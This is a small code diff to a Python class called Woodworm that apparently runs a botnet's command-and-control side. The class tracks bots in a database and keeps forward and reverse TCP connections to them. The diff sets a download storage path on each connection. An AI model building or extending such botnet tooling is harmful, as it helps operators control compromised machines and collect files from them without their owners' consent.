@@ -76,6 +76,7 @@ class Woodworm:
             bot = context.Context(nick, ip, port)
             tcpClient = tcp_services.TCPClient(ip, port)
             bot.set_tcp_connection(await tcpClient.connect())
+            bot.get_tcp_connection().set_download_path(self.storageDirectory)
             self.botnetDB.add_bot(bot)
 
             self.syslog.log(f"Bot added to DB: nick: {nick}, ip: {ip} port: {port}", level=logger.LogLevel.INFO)
@@ -186,6 +187,7 @@ class Woodworm:
             return
         
         bot.set_reversed_tcp_connection(connection)
+        bot.get_reversed_tcp_connection().set_download_path(self.storageDirectory)
         self.syslog.log(f"Reverse connection established with nick: {nick}", level=logger.LogLevel.INFO)
 
 
